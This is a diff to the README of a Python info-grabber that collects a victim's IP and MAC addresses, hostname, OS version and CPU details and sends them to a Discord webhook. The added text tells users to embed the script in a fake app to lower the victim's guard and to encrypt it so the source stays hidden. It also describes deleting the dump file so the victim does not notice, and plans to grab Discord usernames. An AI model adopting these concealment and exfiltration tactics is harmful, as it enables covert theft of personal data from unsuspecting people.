@@ -1,27 +1,27 @@
 # INFO-Grabber-Discord-Webhook
 Python program that grabs info of os, hardware, discord username etc. and sends it to a Discord WebHook.
 
+This program was not created to be all-in-one grabber. It was created to do some fake app and then add this program's source code to your creation to have something that will take victim's guard off while the script grabs his PCs info.
+If you want to use only this script it is recommended to change webhook URL and name then encrypt the file so the victim won't be able to see its source code.
 
 
 Version 1.0.0:
 
-What it does:
-Program is able to grab: IP address and MAC address, Operating System name,version and hostname, CPU architecture information.
-After grabbing those information it creates a file named z3k1wm6pf37wash4.txt and writes all grabbed informations into this file.
-After these informations are written the program sends it on the discord server as a webhook and then deletes the file so victim won't figure out what happened.
+What does this program do?
+This program grabs: IP address and MAC address, Operating System name,version and hostname, CPU architecture information.
+After it obtains those information it creates a file named z3k1wm6pf37wash4.txt and writes all grabbed informations into this file.
+After these informations were written the program sends it on the discord server as a webhook and then deletes the file so the victim won't figure out what happened.
+
+To-Do:
+Be able to grab discord username of victim.
 
 
 
+Discord webhook sends this informations as a .text file
 
----------------------------------------------------
-| Discord massage looks like this:                |
----------------------------------------------------
 IP address: [victim's ip address]
 HOSTNAME: [computer hostname]
 MAC ADDRESS: [victim's mac address]
 OPERATING SYSTEM: [os name]
 OPERATING SYSTEM VERSION: [os version / linux kernel version]
 CPU ARCHITECTURE: [cpu architecture]
----------------------------------------------------
-|                                                 |
----------------------------------------------------
